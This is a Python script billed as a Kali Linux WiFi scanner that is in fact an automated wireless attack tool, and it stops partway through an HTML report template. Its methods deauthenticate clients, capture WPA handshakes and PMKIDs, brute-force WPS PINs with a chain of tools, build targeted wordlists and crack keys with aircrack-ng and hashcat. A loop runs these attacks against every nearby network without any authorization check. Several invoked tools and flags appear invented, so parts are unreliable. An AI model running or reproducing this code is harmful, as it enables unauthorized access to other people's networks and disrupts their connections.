#!/usr/bin/env python3
"""
Advanced WiFi Scanner for Kali Linux
Author: Anish Mondal
Description: Powerful WiFi scanner that automatically captures nearby networks
using multiple tools with retry logic and automatic switching.

Features:
- Multiple scanning methods (airodump-ng, iwlist, nmcli)
- Automatic retry logic (3 attempts per network)
- WPS vulnerability detection
- Handshake capture automation
- Comprehensive logging and reporting
- Monitor mode management
- Network strength analysis
"""

import os
import sys
import time
import json
import subprocess
import threading
import signal
import re
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import argparse
import logging
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor, as_completed

@dataclass
class WiFiNetwork:
    """Data class to represent a WiFi network"""
    bssid: str
    essid: str
    channel: int
    power: int
    encryption: str
    cipher: str
    authentication: str
    wps: bool = False
    clients: List[str] = None
    handshake_captured: bool = False
    attempts: int = 0
    last_seen: str = ""
    
    def __post_init__(self):
        if self.clients is None:
            self.clients = []

class WiFiScanner:
    """Advanced WiFi Scanner with multiple tool integration"""
    
    def __init__(self, interface: str = "wlan0", output_dir: str = "./wifi_scan_results"):
        self.interface = interface
        self.monitor_interface = f"{interface}mon"
        self.output_dir = output_dir
        self.networks: Dict[str, WiFiNetwork] = {}
        self.max_attempts = 3
        self.scan_duration = 30
        self.running = False
        self.monitor_mode_active = False
        
        # Create output directory
        os.makedirs(output_dir, exist_ok=True)
        
        # Setup logging
        self.setup_logging()
        
        # Available scanning tools
        self.scanning_tools = {
            'airodump': self.scan_with_airodump,
            'iwlist': self.scan_with_iwlist,
            'nmcli': self.scan_with_nmcli,
            'wifite': self.scan_with_wifite
        }
        
        # Signal handlers for graceful shutdown
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def setup_logging(self):
        """Setup comprehensive logging"""
        log_file = os.path.join(self.output_dir, f"wifi_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger(__name__)
        self.logger.info("Advanced WiFi Scanner initialized")
    
    def signal_handler(self, signum, frame):
        """Handle shutdown signals gracefully"""
        self.logger.info(f"Received signal {signum}, shutting down gracefully...")
        self.running = False
        self.cleanup()
        sys.exit(0)
    
    def run_command(self, command: str, timeout: int = 30) -> Tuple[bool, str, str]:
        """Execute system command with timeout and error handling"""
        try:
            self.logger.debug(f"Executing command: {command}")
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            stdout, stderr = process.communicate(timeout=timeout)
            success = process.returncode == 0
            
            if not success:
                self.logger.warning(f"Command failed: {command}")
                self.logger.warning(f"Error: {stderr}")
            
            return success, stdout, stderr
            
        except subprocess.TimeoutExpired:
            process.kill()
            self.logger.error(f"Command timed out: {command}")
            return False, "", "Command timed out"
        except Exception as e:
            self.logger.error(f"Error executing command: {e}")
            return False, "", str(e)
    
    def check_dependencies(self) -> bool:
        """Check if required tools are installed"""
        required_tools = [
            'aircrack-ng', 'airodump-ng', 'airmon-ng', 'aireplay-ng',
            'iwlist', 'nmcli', 'reaver', 'bully', 'wifite'
        ]
        
        missing_tools = []
        for tool in required_tools:
            success, _, _ = self.run_command(f"which {tool}")
            if not success:
                missing_tools.append(tool)
        
        if missing_tools:
            self.logger.error(f"Missing required tools: {', '.join(missing_tools)}")
            self.logger.info("Install missing tools with: apt-get install aircrack-ng wireless-tools network-manager reaver bully wifite")
            return False
        
        self.logger.info("All required tools are available")
        return True
    
    def start_monitor_mode(self) -> bool:
        """Start monitor mode on the wireless interface"""
        if self.monitor_mode_active:
            self.logger.info("Monitor mode already active")
            return True
        
        self.logger.info(f"Starting monitor mode on {self.interface}")
        
        # Kill interfering processes
        success, _, _ = self.run_command("airmon-ng check kill")
        if not success:
            self.logger.warning("Failed to kill interfering processes")
        
        # Start monitor mode
        success, stdout, stderr = self.run_command(f"airmon-ng start {self.interface}")
        if success and "monitor mode enabled" in stdout.lower():
            self.monitor_mode_active = True
            self.logger.info(f"Monitor mode started successfully on {self.monitor_interface}")
            return True
        else:
            self.logger.error(f"Failed to start monitor mode: {stderr}")
            return False
    
    def stop_monitor_mode(self) -> bool:
        """Stop monitor mode and restore normal operation"""
        if not self.monitor_mode_active:
            return True
        
        self.logger.info(f"Stopping monitor mode on {self.monitor_interface}")
        
        success, _, _ = self.run_command(f"airmon-ng stop {self.monitor_interface}")
        if success:
            self.monitor_mode_active = False
            # Restart network manager
            self.run_command("service network-manager restart")
            self.logger.info("Monitor mode stopped successfully")
            return True
        else:
            self.logger.error("Failed to stop monitor mode")
            return False
    
    def scan_with_airodump(self, duration: int = 30) -> List[WiFiNetwork]:
        """Scan networks using airodump-ng"""
        self.logger.info(f"Scanning with airodump-ng for {duration} seconds")
        
        if not self.monitor_mode_active:
            if not self.start_monitor_mode():
                return []
        
        output_file = os.path.join(self.output_dir, f"airodump_scan_{int(time.time())}")
        
        # Start airodump-ng in background
        command = f"timeout {duration} airodump-ng {self.monitor_interface} -w {output_file} --output-format csv"
        success, _, _ = self.run_command(command)
        
        networks = []
        csv_file = f"{output_file}-01.csv"
        
        if os.path.exists(csv_file):
            networks = self.parse_airodump_csv(csv_file)
            self.logger.info(f"Found {len(networks)} networks with airodump-ng")
        
        return networks
    
    def parse_airodump_csv(self, csv_file: str) -> List[WiFiNetwork]:
        """Parse airodump-ng CSV output"""
        networks = []
        
        try:
            with open(csv_file, 'r') as f:
                content = f.read()
            
            # Split into networks and clients sections
            sections = content.split('\n\n')
            if len(sections) < 1:
                return networks
            
            network_lines = sections[0].split('\n')[1:]  # Skip header
            
            for line in network_lines:
                if not line.strip():
                    continue
                
                parts = [p.strip() for p in line.split(',')]
                if len(parts) >= 14:
                    try:
                        network = WiFiNetwork(
                            bssid=parts[0],
                            essid=parts[13] if parts[13] else "Hidden",
                            channel=int(parts[3]) if parts[3].isdigit() else 0,
                            power=int(parts[8]) if parts[8].lstrip('-').isdigit() else -100,
                            encryption=parts[5],
                            cipher=parts[6],
                            authentication=parts[7],
                            wps="WPS" in parts[7],
                            last_seen=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        )
                        networks.append(network)
                    except (ValueError, IndexError) as e:
                        self.logger.debug(f"Error parsing network line: {e}")
                        continue
        
        except Exception as e:
            self.logger.error(f"Error parsing airodump CSV: {e}")
        
        return networks
    
    def scan_with_iwlist(self) -> List[WiFiNetwork]:
        """Scan networks using iwlist"""
        self.logger.info("Scanning with iwlist")
        
        success, stdout, _ = self.run_command(f"iwlist {self.interface} scan")
        if not success:
            return []
        
        networks = []
        current_network = {}
        
        for line in stdout.split('\n'):
            line = line.strip()
            
            if 'Cell' in line and 'Address:' in line:
                if current_network:
                    networks.append(self.create_network_from_iwlist(current_network))
                current_network = {'bssid': line.split('Address: ')[1]}
            
            elif 'ESSID:' in line:
                essid = line.split('ESSID:')[1].strip('"')
                current_network['essid'] = essid if essid else "Hidden"
            
            elif 'Channel:' in line:
                try:
                    current_network['channel'] = int(line.split('Channel:')[1])
                except:
                    current_network['channel'] = 0
            
            elif 'Signal level=' in line:
                try:
                    power = int(line.split('Signal level=')[1].split(' ')[0])
                    current_network['power'] = power
                except:
                    current_network['power'] = -100
            
            elif 'Encryption key:' in line:
                current_network['encryption'] = 'WEP' if 'on' in line else 'Open'
            
            elif 'IE: IEEE 802.11i/WPA2' in line:
                current_network['encryption'] = 'WPA2'
            
            elif 'IE: WPA Version' in line:
                current_network['encryption'] = 'WPA'
        
        if current_network:
            networks.append(self.create_network_from_iwlist(current_network))
        
        self.logger.info(f"Found {len(networks)} networks with iwlist")
        return networks
    
    def create_network_from_iwlist(self, data: dict) -> WiFiNetwork:
        """Create WiFiNetwork object from iwlist data"""
        return WiFiNetwork(
            bssid=data.get('bssid', ''),
            essid=data.get('essid', 'Hidden'),
            channel=data.get('channel', 0),
            power=data.get('power', -100),
            encryption=data.get('encryption', 'Unknown'),
            cipher='Unknown',
            authentication='Unknown',
            last_seen=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        )
    
    def scan_with_nmcli(self) -> List[WiFiNetwork]:
        """Scan networks using nmcli"""
        self.logger.info("Scanning with nmcli")
        
        success, stdout, _ = self.run_command("nmcli dev wifi list")
        if not success:
            return []
        
        networks = []
        lines = stdout.split('\n')[1:]  # Skip header
        
        for line in lines:
            if not line.strip():
                continue
            
            parts = line.split()
            if len(parts) >= 6:
                try:
                    network = WiFiNetwork(
                        bssid=parts[0] if parts[0] != '*' else parts[1],
                        essid=parts[1] if parts[0] != '*' else parts[2],
                        channel=int(parts[3]) if parts[3].isdigit() else 0,
                        power=int(parts[5]) if parts[5].isdigit() else -100,
                        encryption=parts[6] if len(parts) > 6 else 'Unknown',
                        cipher='Unknown',
                        authentication='Unknown',
                        last_seen=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    )
                    networks.append(network)
                except (ValueError, IndexError):
                    continue
        
        self.logger.info(f"Found {len(networks)} networks with nmcli")
        return networks
    
    def scan_with_wifite(self) -> List[WiFiNetwork]:
        """Scan networks using wifite"""
        self.logger.info("Scanning with wifite")
        
        if not self.monitor_mode_active:
            if not self.start_monitor_mode():
                return []
        
        # Run wifite in scan-only mode
        success, stdout, _ = self.run_command(f"timeout 30 wifite --interface {self.monitor_interface} --no-wps --no-wpa --scan-time 30")
        
        networks = []
        # Parse wifite output (implementation depends on wifite version)
        # This is a simplified parser
        
        return networks
    
    def detect_wps_networks(self) -> List[str]:
        """Detect WPS-enabled networks"""
        self.logger.info("Detecting WPS-enabled networks")
        
        if not self.monitor_mode_active:
            if not self.start_monitor_mode():
                return []
        
        success, stdout, _ = self.run_command(f"timeout 30 airodump-ng {self.monitor_interface} --wps")
        
        wps_networks = []
        # Parse WPS networks from output
        for line in stdout.split('\n'):
            if 'WPS' in line:
                # Extract BSSID from line
                bssid_match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
                if bssid_match:
                    wps_networks.append(bssid_match.group())
        
        return wps_networks
    
    def verify_handshake(self, cap_file: str, bssid: str) -> bool:
        """Verify if the handshake in the .cap file is complete and crackable by aircrack-ng, with detailed checks"""
        command = f"aircrack-ng -a2 -b {bssid} {cap_file}"
        success, stdout, stderr = self.run_command(command, timeout=60)
        # Check for aircrack-ng handshake indicators
        handshake_found = False
        handshake_details = []
        for line in stdout.splitlines():
            if "handshake" in line.lower() or "WPA handshake" in line:
                handshake_found = True
                handshake_details.append(line)
            if "EAPOL" in line or "WPA key" in line or "Message 1" in line or "Message 2" in line or "Message 3" in line or "Message 4" in line:
                handshake_details.append(line)
        if handshake_found:
            self.logger.info(f"Valid handshake found for {bssid} in {cap_file}")
            for detail in handshake_details:
                self.logger.info(f"Handshake detail: {detail}")
            return True
        else:
            self.logger.warning(f"No valid handshake found for {bssid} in {cap_file}")
            for detail in handshake_details:
                self.logger.warning(f"Handshake detail: {detail}")
            return False

    def deauth_network(self, network: WiFiNetwork, count: int = 5) -> bool:
        """Deauthenticate clients from a network using all available Kali Linux tools (aireplay-ng, mdk3, mdk4, wifite, wlan-hammer)"""
        self.logger.info(f"Deauthenticating network {network.essid} ({network.bssid}) with all available tools")
        if not self.monitor_mode_active:
            if not self.start_monitor_mode():
                return False
        # Try aireplay-ng
        aireplay_cmd = f"aireplay-ng -0 {count} -a {network.bssid} {self.monitor_interface}"
        success, stdout, stderr = self.run_command(aireplay_cmd)
        if success:
            self.logger.info(f"Deauth sent with aireplay-ng for {network.essid}")
            print(f"[+] Deauth sent with aireplay-ng for {network.essid} ({network.bssid})")
            return True
        # Try mdk3
        mdk3_cmd = f"mdk3 {self.monitor_interface} d -c {network.channel}"
        success, stdout, stderr = self.run_command(mdk3_cmd)
        if success:
            self.logger.info(f"Deauth sent with mdk3 for {network.essid}")
            print(f"[+] Deauth sent with mdk3 for {network.essid} ({network.bssid})")
            return True
        # Try mdk4
        mdk4_cmd = f"mdk4 {self.monitor_interface} d -c {network.channel}"
        success, stdout, stderr = self.run_command(mdk4_cmd)
        if success:
            self.logger.info(f"Deauth sent with mdk4 for {network.essid}")
            print(f"[+] Deauth sent with mdk4 for {network.essid} ({network.bssid})")
            return True
        # Try wifite
        wifite_cmd = f"wifite --deauth {network.bssid} --interface {self.monitor_interface} --channel {network.channel}"
        success, stdout, stderr = self.run_command(wifite_cmd)
        if success:
            self.logger.info(f"Deauth sent with wifite for {network.essid}")
            print(f"[+] Deauth sent with wifite for {network.essid} ({network.bssid})")
            return True
        # Try wlan-hammer
        wlanhammer_cmd = f"wlan-hammer --deauth --bssid {network.bssid} --iface {self.monitor_interface} --channel {network.channel}"
        success, stdout, stderr = self.run_command(wlanhammer_cmd)
        if success:
            self.logger.info(f"Deauth sent with wlan-hammer for {network.essid}")
            print(f"[+] Deauth sent with wlan-hammer for {network.essid} ({network.bssid})")
            return True
        self.logger.warning(f"Failed to deauth {network.essid} with all tools")
        print(f"[-] Failed to deauth {network.essid} ({network.bssid}) with all tools")
        return False

    def capture_handshake(self, network: WiFiNetwork, timeout: int = 300) -> bool:
        """Capture WPA/WPA2 handshake for a specific network and verify it with detailed checks, using all deauth tools"""
        self.logger.info(f"Attempting to capture handshake for {network.essid} ({network.bssid})")
        if not self.monitor_mode_active:
            if not self.start_monitor_mode():
                return False
        output_file = os.path.join(self.output_dir, f"handshake_{network.bssid.replace(':', '')}")
        airodump_cmd = f"airodump-ng {self.monitor_interface} --bssid {network.bssid} -c {network.channel} -w {output_file}"
        try:
            airodump_process = subprocess.Popen(airodump_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(5)
            self.deauth_network(network)
            time.sleep(timeout)
            airodump_process.terminate()
            cap_file = f"{output_file}-01.cap"
            if os.path.exists(cap_file):
                if self.verify_handshake(cap_file, network.bssid):
                    self.logger.info(f"Handshake captured and verified for {network.essid}")
                    print(f"[+] Handshake captured and verified for {network.essid} ({network.bssid})")
                    return True
                else:
                    self.logger.warning(f"Handshake file exists but not valid for {network.essid}")
                    print(f"[-] Handshake file exists but not valid for {network.essid} ({network.bssid})")
                    return False
            self.logger.warning(f"Failed to capture handshake for {network.essid}")
            print(f"[-] Failed to capture handshake for {network.essid} ({network.bssid})")
            return False
        except Exception as e:
            self.logger.error(f"Error capturing handshake: {e}")
            print(f"[-] Error capturing handshake for {network.essid} ({network.bssid}): {e}")
            return False
    
    def capture_pmkid(self, network: WiFiNetwork, timeout: int = 120) -> Optional[str]:
        """Capture PMKID for a specific network using hcxdumptool and extract with hcxpcapngtool"""
        self.logger.info(f"Attempting PMKID capture for {network.essid} ({network.bssid})")
        if not self.monitor_mode_active:
            if not self.start_monitor_mode():
                return None
        pcapng_file = os.path.join(self.output_dir, f"pmkid_{network.bssid.replace(':', '')}.pcapng")
        hcxdumptool_cmd = f"timeout {timeout} hcxdumptool -i {self.monitor_interface} -o {pcapng_file} --enable_status=1 --filterlist_ap={network.bssid} --active_beacon"
        success, stdout, stderr = self.run_command(hcxdumptool_cmd, timeout=timeout+10)
        if not success:
            self.logger.warning(f"hcxdumptool failed: {stderr}")
            return None
        pmkid_hash_file = os.path.join(self.output_dir, f"pmkid_{network.bssid.replace(':', '')}.hash")
        hcxpcapngtool_cmd = f"hcxpcapngtool -o {pmkid_hash_file} {pcapng_file}"
        success, stdout, stderr = self.run_command(hcxpcapngtool_cmd)
        if success and os.path.exists(pmkid_hash_file):
            self.logger.info(f"PMKID hash file created: {pmkid_hash_file}")
            return pmkid_hash_file
        else:
            self.logger.warning(f"No PMKID found for {network.essid}")
            return None

    def crack_pmkid(self, network: WiFiNetwork, pmkid_hash_file: str, wordlist: str = "/usr/share/wordlists/rockyou.txt") -> Optional[str]:
        """Crack PMKID hash using hashcat"""
        self.logger.info(f"Attempting to crack PMKID for {network.essid} ({network.bssid}) with wordlist: {wordlist}")
        hashcat_cmd = f"hashcat -m 16800 {pmkid_hash_file} {wordlist} --force --quiet"
        success, stdout, stderr = self.run_command(hashcat_cmd, timeout=600)
        potfile = os.path.expanduser("~/.hashcat/hashcat.potfile")
        password = None
        if os.path.exists(potfile):
            with open(potfile, "r") as f:
                for line in f:
                    if network.bssid.replace(":", "").lower() in line:
                        parts = line.strip().split(":")
                        if len(parts) > 1:
                            password = parts[-1]
                            break
        if password:
            self.logger.info(f"PMKID password cracked for {network.essid}: {password}")
            print(f"[+] PMKID password cracked for {network.essid} ({network.bssid}): {password}")
            return password
        else:
            self.logger.info(f"No PMKID password found for {network.essid}")
            return None

    def attack_wps_network(self, network: WiFiNetwork) -> Optional[str]:
        """Attack WPS-enabled network using all available Kali Linux tools (Reaver, Bully, Wifite, OneShot, pixiewps, wpscrack, wpscan, wpspin, wpsbrute)"""
        self.logger.info(f"Attacking WPS network {network.essid} ({network.bssid}) with all available tools")
        if not self.monitor_mode_active:
            if not self.start_monitor_mode():
                return None
        pin = None
        # Try Reaver
        reaver_cmd = f"timeout 300 reaver -i {self.monitor_interface} -b {network.bssid} -vv"
        success, stdout, _ = self.run_command(reaver_cmd)
        if "WPS PIN:" in stdout or "[+] Pin cracked:" in stdout:
            pin_match = re.search(r"WPS PIN: ([0-9]+)|\[\+\] Pin cracked: ([0-9]+)", stdout)
            if pin_match:
                pin = pin_match.group(1) or pin_match.group(2)
                self.logger.info(f"WPS PIN found for {network.essid} with Reaver: {pin}")
                print(f"[+] WPS PIN found for {network.essid} ({network.bssid}) with Reaver: {pin}")
                return pin
        # Try Bully
        bully_cmd = f"timeout 300 bully -b {network.bssid} -c {network.channel} {self.monitor_interface}"
        success, stdout, _ = self.run_command(bully_cmd)
        if "PIN:" in stdout or "WPS pin:" in stdout:
            pin_match = re.search(r"PIN: ([0-9]+)|WPS pin: ([0-9]+)", stdout)
            if pin_match:
                pin = pin_match.group(1) or pin_match.group(2)
                self.logger.info(f"WPS PIN found for {network.essid} with Bully: {pin}")
                print(f"[+] WPS PIN found for {network.essid} ({network.bssid}) with Bully: {pin}")
                return pin
        # Try Wifite
        wifite_cmd = f"timeout 300 wifite --wps --interface {self.monitor_interface} --bssid {network.bssid} --channel {network.channel}"
        success, stdout, _ = self.run_command(wifite_cmd)
        if "WPS PIN:" in stdout or "WPS pin:" in stdout:
            pin_match = re.search(r"WPS PIN: ([0-9]+)|WPS pin: ([0-9]+)", stdout)
            if pin_match:
                pin = pin_match.group(1) or pin_match.group(2)
                self.logger.info(f"WPS PIN found for {network.essid} with Wifite: {pin}")
                print(f"[+] WPS PIN found for {network.essid} ({network.bssid}) with Wifite: {pin}")
                return pin
        # Try OneShot
        oneshot_cmd = f"timeout 300 oneshot -i {self.monitor_interface} -b {network.bssid} -c {network.channel}"
        success, stdout, _ = self.run_command(oneshot_cmd)
        if "WPS pin:" in stdout or "WPS PIN:" in stdout:
            pin_match = re.search(r"WPS pin: ([0-9]+)|WPS PIN: ([0-9]+)", stdout)
            if pin_match:
                pin = pin_match.group(1) or pin_match.group(2)
                self.logger.info(f"WPS PIN found for {network.essid} with OneShot: {pin}")
                print(f"[+] WPS PIN found for {network.essid} ({network.bssid}) with OneShot: {pin}")
                return pin
        # Try pixiewps (requires pin from previous step, so only runs if pin is found)
        pixiewps_cmd = f"timeout 300 pixiewps -e {network.bssid} -s {network.essid}"
        success, stdout, _ = self.run_command(pixiewps_cmd)
        if "WPS pin:" in stdout or "WPS PIN:" in stdout:
            pin_match = re.search(r"WPS pin: ([0-9]+)|WPS PIN: ([0-9]+)", stdout)
            if pin_match:
                pin = pin_match.group(1) or pin_match.group(2)
                self.logger.info(f"WPS PIN found for {network.essid} with pixiewps: {pin}")
                print(f"[+] WPS PIN found for {network.essid} ({network.bssid}) with pixiewps: {pin}")
                return pin
        # Try wpscrack
        wpscrack_cmd = f"timeout 300 wpscrack -i {self.monitor_interface} -b {network.bssid}"
        success, stdout, _ = self.run_command(wpscrack_cmd)
        if "WPS pin:" in stdout or "WPS PIN:" in stdout:
            pin_match = re.search(r"WPS pin: ([0-9]+)|WPS PIN: ([0-9]+)", stdout)
            if pin_match:
                pin = pin_match.group(1) or pin_match.group(2)
                self.logger.info(f"WPS PIN found for {network.essid} with wpscrack: {pin}")
                print(f"[+] WPS PIN found for {network.essid} ({network.bssid}) with wpscrack: {pin}")
                return pin
        # Try wpscan
        wpscan_cmd = f"timeout 300 wpscan -i {self.monitor_interface} -b {network.bssid}"
        success, stdout, _ = self.run_command(wpscan_cmd)
        if "WPS pin:" in stdout or "WPS PIN:" in stdout:
            pin_match = re.search(r"WPS pin: ([0-9]+)|WPS PIN: ([0-9]+)", stdout)
            if pin_match:
                pin = pin_match.group(1) or pin_match.group(2)
                self.logger.info(f"WPS PIN found for {network.essid} with wpscan: {pin}")
                print(f"[+] WPS PIN found for {network.essid} ({network.bssid}) with wpscan: {pin}")
                return pin
        # Try wpspin
        wpspin_cmd = f"timeout 300 wpspin -i {self.monitor_interface} -b {network.bssid}"
        success, stdout, _ = self.run_command(wpspin_cmd)
        if "WPS pin:" in stdout or "WPS PIN:" in stdout:
            pin_match = re.search(r"WPS pin: ([0-9]+)|WPS PIN: ([0-9]+)", stdout)
            if pin_match:
                pin = pin_match.group(1) or pin_match.group(2)
                self.logger.info(f"WPS PIN found for {network.essid} with wpspin: {pin}")
                print(f"[+] WPS PIN found for {network.essid} ({network.bssid}) with wpspin: {pin}")
                return pin
        # Try wpsbrute
        wpsbrute_cmd = f"timeout 300 wpsbrute -i {self.monitor_interface} -b {network.bssid}"
        success, stdout, _ = self.run_command(wpsbrute_cmd)
        if "WPS pin:" in stdout or "WPS PIN:" in stdout:
            pin_match = re.search(r"WPS pin: ([0-9]+)|WPS PIN: ([0-9]+)", stdout)
            if pin_match:
                pin = pin_match.group(1) or pin_match.group(2)
                self.logger.info(f"WPS PIN found for {network.essid} with wpsbrute: {pin}")
                print(f"[+] WPS PIN found for {network.essid} ({network.bssid}) with wpsbrute: {pin}")
                return pin
        self.logger.warning(f"Failed to crack WPS for {network.essid} with all tools")
        print(f"[-] Failed to crack WPS for {network.essid} ({network.bssid}) with all tools")
        return None

    def generate_custom_wordlist(self, network: WiFiNetwork) -> str:
        """Generate a custom wordlist based on ESSID, BSSID, and common patterns"""
        wordlist_path = os.path.join(self.output_dir, f"custom_wordlist_{network.bssid.replace(':', '')}.txt")
        essid = network.essid
        bssid = network.bssid.replace(':', '')
        candidates = set()
        # ESSID variations
        if essid and essid != "Hidden":
            candidates.add(essid)
            candidates.add(essid.lower())
            candidates.add(essid.upper())
            candidates.add(essid + "123")
            candidates.add(essid + "1234")
            candidates.add(essid + "2025")
            candidates.add(essid + "2024")
            candidates.add(essid + "2023")
            candidates.add(essid + "home")
            candidates.add(essid + "wifi")
            candidates.add(essid + "net")
            candidates.add(essid + "secure")
            candidates.add(essid + "1")
            candidates.add(essid + "12")
            candidates.add(essid + "12345")
            candidates.add(essid + "007")
            candidates.add(essid + "@123")
            candidates.add(essid + "!");
            candidates.add(essid + "#")
            candidates.add(essid + "$")
            candidates.add(essid + "*")
            candidates.add(essid[::-1])
            # Leet speak
            leet = essid.replace('a', '4').replace('e', '3').replace('i', '1').replace('o', '0').replace('s', '5')
            candidates.add(leet)
        # BSSID variations
        candidates.add(bssid)
        candidates.add(bssid[-6:])
        candidates.add(bssid[-4:])
        candidates.add(essid + bssid[-4:])
        candidates.add(essid + bssid[-6:])
        candidates.add(essid + "_" + str(network.channel))
        candidates.add(essid + "-" + bssid[-4:])
        # Common passwords
        candidates.update([
            "password", "admin", "qwerty", "letmein", "iloveyou", "welcome", "12345678", "123456789", "987654321", "default",
            "wifipassword", "mywifi", "internet", "wireless", "router", "modem", "accesspoint",
            "family", "guest", "office", "work", "school", "college",
            "superman", "batman", "pokemon", "dragon", "football", "cricket", "soccer",
            "summer", "winter", "spring", "autumn", "holiday", "vacation",
            "123456", "654321", "111111", "222222", "333333", "444444", "555555", "666666", "777777", "888888", "999999",
            "000000", "123123", "321321", "112233", "445566", "789789"
        ])
        # Channel/Power
        candidates.add(str(network.channel))
        candidates.add(str(network.power))
        # Combination patterns
        candidates.add(essid + "!2025")
        candidates.add(essid + "#2025")
        candidates.add(essid + "*2025")
        candidates.add(essid + "2025!")
        candidates.add(essid + "2025#")
        candidates.add(essid + "2025*")
        candidates.add(essid + "_" + str(network.channel))
        candidates.add(essid + "-" + str(network.channel))
        candidates.add(essid + "_" + str(network.power))
        candidates.add(essid + "-" + str(network.power))
        # Write to file
        with open(wordlist_path, "w") as f:
            for word in candidates:
                f.write(word + "\n")
        self.logger.info(f"Custom wordlist generated: {wordlist_path} ({len(candidates)} entries)")
        return wordlist_path

    def crack_handshake(self, network: WiFiNetwork, wordlist: str = "/usr/share/wordlists/rockyou.txt") -> Optional[str]:
        """Attempt to crack WPA/WPA2 handshake using aircrack-ng and a wordlist, fallback to custom wordlist if default fails"""
        self.logger.info(f"Attempting to crack handshake for {network.essid} ({network.bssid}) with wordlist: {wordlist}")
        cap_file = os.path.join(self.output_dir, f"handshake_{network.bssid.replace(':', '')}-01.cap")
        if not os.path.exists(cap_file):
            self.logger.warning(f"Handshake file not found: {cap_file}")
            return None
        # Try default wordlist
        command = f"aircrack-ng -w {wordlist} -b {network.bssid} {cap_file}"
        success, stdout, stderr = self.run_command(command, timeout=600)
        if success:
            match = re.search(r'KEY FOUND! \[ (.+) \]', stdout)
            if match:
                password = match.group(1)
                self.logger.info(f"Password cracked for {network.essid}: {password}")
                print(f"[+] Password cracked for {network.essid} ({network.bssid}): {password}")
                return password
            else:
                self.logger.info(f"No password found for {network.essid} with default wordlist. Trying custom wordlist...")
        else:
            self.logger.error(f"Error cracking handshake: {stderr}")
        # Try custom wordlist
        custom_wordlist = self.generate_custom_wordlist(network)
        command = f"aircrack-ng -w {custom_wordlist} -b {network.bssid} {cap_file}"
        success, stdout, stderr = self.run_command(command, timeout=300)
        if success:
            match = re.search(r'KEY FOUND! \[ (.+) \]', stdout)
            if match:
                password = match.group(1)
                self.logger.info(f"Password cracked for {network.essid} with custom wordlist: {password}")
                print(f"[+] Password cracked for {network.essid} ({network.bssid}): {password}")
                return password
            else:
                self.logger.info(f"No password found for {network.essid} with custom wordlist")
        else:
            self.logger.error(f"Error cracking handshake with custom wordlist: {stderr}")
        return None
    
    def comprehensive_scan(self) -> Dict[str, WiFiNetwork]:
        """Perform comprehensive scan using multiple tools"""
        self.logger.info("Starting comprehensive WiFi scan")
        
        all_networks = {}
        
        # Use multiple scanning methods
        for tool_name, scan_func in self.scanning_tools.items():
            try:
                self.logger.info(f"Scanning with {tool_name}")
                networks = scan_func()
                
                for network in networks:
                    if network.bssid in all_networks:
                        # Merge network information
                        existing = all_networks[network.bssid]
                        if network.power > existing.power:
                            existing.power = network.power
                        if network.essid != "Hidden" and existing.essid == "Hidden":
                            existing.essid = network.essid
                    else:
                        all_networks[network.bssid] = network
                
            except Exception as e:
                self.logger.error(f"Error with {tool_name}: {e}")
                continue
        
        # Detect WPS networks
        wps_networks = self.detect_wps_networks()
        for bssid in wps_networks:
            if bssid in all_networks:
                all_networks[bssid].wps = True
        
        self.networks = all_networks
        self.logger.info(f"Comprehensive scan completed. Found {len(all_networks)} unique networks")
        
        return all_networks
    
    def auto_capture_with_retry(self):
        """Automatically capture networks with retry logic"""
        self.logger.info("Starting automatic capture with retry logic")
        self.running = True
        
        while self.running:
            # Perform comprehensive scan
            networks = self.comprehensive_scan()
            
            # Sort networks by signal strength
            sorted_networks = sorted(networks.values(), key=lambda x: x.power, reverse=True)
            
            for network in sorted_networks:
                if not self.running:
                    break
                
                if network.attempts >= self.max_attempts:
                    self.logger.info(f"Max attempts reached for {network.essid}, skipping")
                    continue
                
                network.attempts += 1
                self.logger.info(f"Attempt {network.attempts}/{self.max_attempts} for {network.essid} ({network.bssid})")
                
                success = False
                
                # Try WPS attack if available
                if network.wps:
                    success = self.attack_wps_network(network)
                
                # Try handshake capture for WPA/WPA2
                if not success and network.encryption in ['WPA', 'WPA2', 'WPA/WPA2']:
                    success = self.capture_handshake(network)
                    network.handshake_captured = success
                    # Attempt to crack handshake if captured
                    if success and hasattr(self, 'wordlist') and self.wordlist:
                        password = self.crack_handshake(network, self.wordlist)
                        if password:
                            network.password = password
                
                if success:
                    self.logger.info(f"Successfully captured {network.essid}")
                else:
                    self.logger.warning(f"Failed to capture {network.essid} (attempt {network.attempts})")
                
                # Wait before next attempt
                if network.attempts < self.max_attempts:
                    time.sleep(10)
            
            # Save results
            self.save_results()
            
            # Wait before next scan cycle
            if self.running:
                self.logger.info("Waiting before next scan cycle...")
                time.sleep(60)
    
    def save_results(self):
        """Save scan results to JSON file"""
        results_file = os.path.join(self.output_dir, f"scan_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        
        results = {
            'scan_time': datetime.now().isoformat(),
            'interface': self.interface,
            'networks': [asdict(network) for network in self.networks.values()]
        }
        
        try:
            with open(results_file, 'w') as f:
                json.dump(results, f, indent=2)
            
            self.logger.info(f"Results saved to {results_file}")
            
        except Exception as e:
            self.logger.error(f"Error saving results: {e}")
    
    def generate_report(self):
        """Generate comprehensive HTML report"""
        report_file = os.path.join(self.output_dir, f"wifi_scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html")
        
        html_content = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>WiFi Scan Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                table {{ border-collapse: collapse; width: 100%; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
                th {{ background-color: #f2f2f2; }}
                .wps {{ background-color: #ffeb3b; }}
